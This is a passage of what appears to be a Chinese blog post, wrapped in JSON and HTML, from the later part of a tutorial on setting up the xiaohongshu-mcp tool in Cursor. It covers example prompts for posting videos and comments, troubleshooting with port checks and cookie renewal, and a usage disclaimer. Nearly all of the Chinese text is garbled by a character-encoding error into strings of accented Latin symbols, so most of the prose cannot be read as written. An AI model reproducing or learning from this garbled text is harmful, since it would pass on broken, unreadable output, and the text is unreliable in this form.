id=\"æ­¥éª¤3æŸ¥çœ‹å‘å¸ƒç»“æžœ\">æ­¥éª¤3ï¼šæŸ¥çœ‹å‘å¸ƒç»“æžœ</h3>\n<p>å‘é€æŒ‡ä»¤åŽï¼ŒCursorä¼šè¿”å›žå‘å¸ƒè¿›åº¦ï¼ŒæˆåŠŸåŽå¯åœ¨å°çº¢ä¹¦Appä¸­æŸ¥çœ‹å‘å¸ƒçš„ç¬”è®°ã€‚</p>\n<h2 id=\"53-å…¶ä»–å¸¸ç”¨åŠŸèƒ½è°ƒç”¨\">5.3 å…¶ä»–å¸¸ç”¨åŠŸèƒ½è°ƒç”¨</h2>\n<ul>\n<li>å‘å¸ƒè§†é¢‘ï¼š<pre><code>@xiaohongshu-mcp å‘å¸ƒå°çº¢ä¹¦è§†é¢‘ï¼Œæ ‡é¢˜ï¼šã€ŒMCPéƒ¨ç½²å®žæ“æ¼”ç¤ºã€ï¼Œæ­£æ–‡ï¼šã€Œæ‰‹æŠŠæ‰‹æ•™ä½ éƒ¨ç½²å°çº¢ä¹¦MCPï½žã€ï¼Œè§†é¢‘è·¯å¾„ï¼š/Users/ä½ çš„ç”¨æˆ·å/xiaohongshu-mcp/videos/æ¼”ç¤º.mp4\n</code></pre>\n</li>\n<li>èŽ·å–ç”¨æˆ·ä¸ªäººä¸»é¡µï¼š<pre><code>@xiaohongshu-mcp èŽ·å–ç”¨æˆ·IDä¸º123456çš„å°çº¢ä¹¦ä¸ªäººä¸»é¡µä¿¡æ¯\n</code></pre>\n</li>\n<li>å‘è¡¨è¯„è®ºï¼š<pre><code>@xiaohongshu-mcp ç»™å¸–å­IDä¸º741852çš„å°çº¢ä¹¦ç¬”è®°å‘è¡¨è¯„è®ºï¼šã€Œæ•™ç¨‹è¶…å®žç”¨ï¼ã€\n</code></pre>\n</li>\n</ul>\n<h1 id=\"å…­å¸¸è§é—®é¢˜ä¸Žè§£å†³æ–¹æ¡ˆ\">å…­ã€å¸¸è§é—®é¢˜ä¸Žè§£å†³æ–¹æ¡ˆ</h1>\n<h2 id=\"é—®é¢˜1ç™»å½•å·¥å…·è¿è¡ŒåŽæ— å¼¹çª—ä¸‹è½½æµè§ˆå™¨å¤±è´¥\">é—®é¢˜1ï¼šç™»å½•å·¥å…·è¿è¡ŒåŽæ— å¼¹çª—/ä¸‹è½½æµè§ˆå™¨å¤±è´¥</h2>\n<ul>\n<li>åŽŸå› ï¼šç½‘ç»œé™åˆ¶æˆ–æƒé™ä¸è¶³ï¼›</li>\n<li>è§£å†³æ–¹æ¡ˆï¼š\n<ol>\n<li>ç¡®ä¿ç½‘ç»œèƒ½è®¿é—®å¤–ç½‘ï¼Œæˆ–åˆ‡æ¢ç½‘ç»œé‡è¯•ï¼›</li>\n<li>Windowséœ€ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œç»ˆç«¯ï¼ŒmacOS/Linuxéœ€èµ‹äºˆæ–‡ä»¶æ‰§è¡Œæƒé™ï¼ˆ<code>chmod +x æ–‡ä»¶å</code>ï¼‰ã€‚</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"é—®é¢˜2cursoræç¤ºæ— æ³•è¿žæŽ¥åˆ°mcpæœåŠ¡\">é—®é¢˜2ï¼šCursoræç¤ºã€Œæ— æ³•è¿žæŽ¥åˆ°MCPæœåŠ¡ã€</h2>\n<ul>\n<li>åŽŸå› ï¼šMCPæœåŠ¡æœªå¯åŠ¨/ç«¯å£è¢«å ç”¨/é…ç½®æ–‡ä»¶è·¯å¾„é”™è¯¯ï¼›</li>\n<li>è§£å†³æ–¹æ¡ˆï¼š\n<ol>\n<li>æ£€æŸ¥MCPæœåŠ¡æ˜¯å¦æ­£å¸¸è¿è¡Œï¼ˆç»ˆç«¯æ˜¯å¦æ˜¾ç¤ºç«¯å£18060ï¼‰ï¼›</li>\n<li>ç¡®è®¤ <code>.cursor/mcp.json</code> ä¸­çš„URLæ˜¯ <code>http://localhost:18060/mcp</code>ï¼›</li>\n<li>æ£€æŸ¥18060ç«¯å£æ˜¯å¦è¢«å ç”¨ï¼ˆWindowsï¼š<code>netstat -ano | findstr 18060</code>ï¼ŒmacOS/Linuxï¼š<code>lsof -i:18060</code>ï¼‰ï¼Œå ç”¨åˆ™å…³é—­å¯¹åº”è¿›ç¨‹ã€‚</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"é—®é¢˜3å‘å¸ƒå›¾æ–‡æç¤ºå›¾ç‰‡è·¯å¾„é”™è¯¯\">é—®é¢˜3ï¼šå‘å¸ƒå›¾æ–‡æç¤ºã€Œå›¾ç‰‡è·¯å¾„é”™è¯¯ã€</h2>\n<ul>\n<li>åŽŸå› ï¼šå›¾ç‰‡è·¯å¾„ä¸æ˜¯ç»å¯¹è·¯å¾„/æœªæ”¾åˆ°æŒ‡å®šç›®å½•ï¼›</li>\n<li>è§£å†³æ–¹æ¡ˆï¼š\n<ol>\n<li>ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼ˆå¦‚ <code>D:\\xiaohongshu-mcp\\images\\test.jpg</code>ï¼‰ï¼›</li>\n<li>ç¡®ä¿å›¾ç‰‡æ–‡ä»¶å­˜åœ¨ï¼Œä¸”è·¯å¾„æ— ä¸­æ–‡/ç©ºæ ¼ã€‚</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"é—®é¢˜4è´¦å·è¢«è¸¢ä¸‹çº¿\">é—®é¢˜4ï¼šè´¦å·è¢«è¸¢ä¸‹çº¿</h2>\n<ul>\n<li>åŽŸå› ï¼šåŒä¸€è´¦å·åœ¨å…¶ä»–ç½‘é¡µç«¯ç™»å½•ï¼›</li>\n<li>è§£å†³æ–¹æ¡ˆï¼š\n<ol>\n<li>é€€å‡ºå…¶ä»–ç½‘é¡µç«¯çš„å°çº¢ä¹¦ç™»å½•ï¼›</li>\n<li>é‡æ–°è¿è¡Œç™»å½•å·¥å…·ï¼Œé‡æ–°ç”ŸæˆCookiesã€‚</li>\n</ol>\n</li>\n</ul>\n<h1 id=\"ä¸ƒæ€»ç»“\">ä¸ƒã€æ€»ç»“</h1>\n<p>é€šè¿‡ã€Œä¸‹è½½å®‰è£…åŒ…ã€çš„æ–¹å¼éƒ¨ç½²å°çº¢ä¹¦MCPï¼Œå…¨ç¨‹æ— éœ€é…ç½®å¤æ‚çš„å¼€å‘çŽ¯å¢ƒï¼ˆå¦‚Golangã€Dockerï¼‰ï¼Œæ–°æ‰‹ä¹Ÿèƒ½åœ¨10åˆ†é’Ÿå†…å®Œæˆéƒ¨ç½²ã€‚æŽ¥å…¥CursoråŽï¼Œå¯ç›´æŽ¥é€šè¿‡è‡ªç„¶è¯­è¨€è°ƒç”¨MCPçš„æ‰€æœ‰åŠŸèƒ½ï¼Œå®žçŽ°å°çº¢ä¹¦ç™»å½•éªŒè¯ã€å›¾æ–‡/è§†é¢‘å‘å¸ƒã€è¯„è®ºäº’åŠ¨ç­‰è‡ªåŠ¨åŒ–æ“ä½œã€‚</p>\n<p>âš ï¸ é£Žé™©æç¤ºï¼šè¯¥å·¥å…·ä»…ç”¨äºŽå­¦ä¹ å’Œä¸ªäººåˆæ³•è¿è¥ï¼Œè¯·å‹¿ç”¨äºŽè¿è§„æ“ä½œï¼›Cookiesè¿‡æœŸåŽéœ€é‡æ–°ç™»å½•ï¼Œæ­£å¸¸ä½¿ç”¨ä¸‹ä¸ä¼šå¯¼è‡´è´¦å·å°ç¦ã€‚</p>\n<p>å¦‚æžœåœ¨éƒ¨ç½²è¿‡ç¨‹ä¸­é‡åˆ°é—®é¢˜ï¼Œå¯å‚è€ƒé¡¹ç›®çš„å®˜æ–¹æ–‡æ¡£ï¼ˆ<a href=\"https://github.com/xpzouying/xiaohongshu-mcp\" rel=\"noopener nofollow\" target=\"_blank\">xiaohongshu-mcp README</a>ï¼‰ï¼Œæˆ–åœ¨GitHub Issuesä¸­æé—®ã€‚</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-17 13:49</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ChenAI-TGF\">TTGF</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">0</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    }
  ]
}